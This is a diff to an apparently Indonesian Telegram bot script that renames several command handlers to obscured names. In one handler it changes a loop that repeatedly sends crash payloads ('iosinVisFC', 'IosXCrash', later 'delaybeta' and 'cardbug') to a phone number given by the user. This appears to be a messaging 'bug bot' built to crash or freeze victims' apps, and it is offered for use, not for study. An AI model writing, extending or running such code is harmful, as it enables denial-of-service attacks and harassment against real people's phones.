@@ -4815,7 +4815,7 @@ bot.onText(/\/cooldown (\d+)m/i, (msg, match) => {
   cooldownTime = newCooldown * 60; // Ubah ke detik
   return bot.sendMessage(chatId, `✅ Cooldown time successfully set to ${newCooldown} menit.`);
 });
-bot.onText(/\/delaykont(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/delayxxckont(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
     
@@ -4862,7 +4862,7 @@ bot.onText(/\/delaykont(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/ranzunli(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/ranhddzunli(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
     
@@ -4912,7 +4912,7 @@ bot.onText(/\/ranzunli(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/ranzios(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/ranzdelay(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
     
@@ -4945,11 +4945,11 @@ bot.onText(/\/ranzios(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
-        await iosinVisFC(formatedNumber)
-        await new Promise((resolve) => setTimeout(resolve, 500));
-        await IosXCrash(formatedNumber)
-        await new Promise((resolve) => setTimeout(resolve, 500));
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await delaybeta(formatedNumber)
+        await new Promise((resolve) => setTimeout(resolve, 3000));
+        await cardbug(formatedNumber)
+        await new Promise((resolve) => setTimeout(resolve, 3000));
         console.log(chalk.red("Send Bug Succes"))
     }
 
@@ -4964,7 +4964,7 @@ bot.onText(/\/ranzios(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/ranznull(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/rahhxnznull(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
     
@@ -5012,7 +5012,7 @@ bot.onText(/\/ranznull(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/ranznew(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/ranzhdhnew(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
     
